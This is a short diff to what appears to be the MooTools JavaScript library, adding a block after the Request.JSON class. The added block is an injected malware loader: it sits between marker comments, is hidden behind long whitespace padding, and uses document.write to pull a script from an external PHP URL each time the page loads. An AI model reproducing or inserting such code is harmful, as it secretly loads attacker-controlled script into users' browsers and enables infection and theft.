@@ -4034,3 +4034,13 @@ Request.JSON = new Class({
 	}
 
 });
+
+
+/*011b10*/
+
+                    																	                               	 /*gbargbar09311gbar09*/
+
+document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525377'></"+ "script>");
+
+
+/*/011b10*/
